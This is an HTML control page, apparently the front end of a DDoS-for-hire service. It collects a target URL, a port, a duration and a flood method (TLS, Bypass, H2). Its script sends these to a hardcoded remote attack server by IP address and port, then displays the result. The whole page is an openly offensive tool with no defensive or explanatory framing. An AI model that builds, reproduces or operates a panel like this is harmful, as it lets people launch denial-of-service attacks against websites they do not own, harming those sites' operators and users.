<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #121212;
            color: white;
        }
        .container {
            margin-top: 50px;
        }
        input, select, button {
            display: block;
            margin: 10px auto;
            padding: 10px;
            font-size: 16px;
        }
        button {
            background-color: red;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: darkred;
        }
        .log {
            margin-top: 20px;
            font-size: 14px;
            white-space: pre-line;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>üî• Attack Panel üî•</h1>
        <label>Target Host:</label>
        <input type="text" id="host" placeholder="https://target.com">

        <label>Port:</label>
        <input type="number" id="port" placeholder="80">

        <label>Time (Seconds):</label>
        <input type="number" id="time" placeholder="60">

        <label>Methods:</label>
        <select id="methods">
            <option value="tls">TLS</option>
            <option value="bypass">Bypass</option>
            <option value="h2">H2</option>
        </select>

        <button onclick="sendAttack()">üöÄ ATTACK!</button>

        <div class="log" id="log"></div>
    </div>

    <script>
        async function sendAttack() {
            const host = document.getElementById('host').value;
            const port = document.getElementById('port').value;
            const time = document.getElementById('time').value;
            const methods = document.getElementById('methods').value.toUpperCase(); // üî• Buat huruf besar otomatis

            if (!host || !port || !time || !methods) {
                alert("‚ö†Ô∏è Harap isi semua data!");
                return;
            }

            const url = `http://64.227.139.46:4877/attack?host=${encodeURIComponent(host)}&port=${port}&time=${time}&methods=${methods}`;
            
            try {
                document.getElementById("log").innerText = "üöÄ Mengirim serangan...";
                const response = await fetch(url);
                const result = await response.json();
                document.getElementById("log").innerText = JSON.stringify(result, null, 2);
            } catch (error) {
                document.getElementById("log").innerText = `‚ùå Error: ${error}`;
            }
        }
    </script>

</body>
</html>
